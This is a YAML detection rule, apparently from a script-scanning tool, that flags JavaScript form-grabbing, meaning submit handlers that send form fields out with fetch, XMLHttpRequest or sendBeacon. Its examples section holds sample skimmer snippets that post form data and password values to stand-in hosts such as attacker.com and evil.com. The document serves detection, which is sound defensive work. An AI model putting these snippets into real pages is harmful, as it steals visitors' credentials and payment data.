# JavaScript Pattern: Form Data Grabber
# Detects form data interception and theft

id: JS-013
name: Form Data Grabber
description: |
  Detects JavaScript that intercepts form submissions to steal user credentials
  and sensitive data. Attackers hook form submit events to capture passwords,
  credit card numbers, and personal information before legitimate submission.
  This pattern identifies suspicious form event handlers.
languages:
  - javascript
detection_type: regex
detection_logic: '(?:addEventListener\s*\(\s*["\x27]submit|onsubmit\s*=).*(?:\.value|FormData|serialize).*(?:fetch|XMLHttpRequest|\.send\(|navigator\.sendBeacon)'
severity: High
mitre_technique: T1056.003
confidence: 0.85
category: collection
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-11-17"
  updated: "2025-11-17"
  references:
    - "https://attack.mitre.org/techniques/T1056/003/"
    - "https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/submit_event"
  tags:
    - javascript
    - formgrabber
    - credential-theft
    - data-theft
  examples:
    - "document.querySelector('form').addEventListener('submit', function(e) { fetch('http://attacker.com/steal', {method: 'POST', body: new FormData(e.target)}); });"
    - "form.onsubmit = function() { sendData(document.getElementById('password').value); };"
    - "document.forms[0].addEventListener('submit', (e) => { navigator.sendBeacon('http://evil.com/log', JSON.stringify({user: e.target.username.value, pass: e.target.password.value})); });"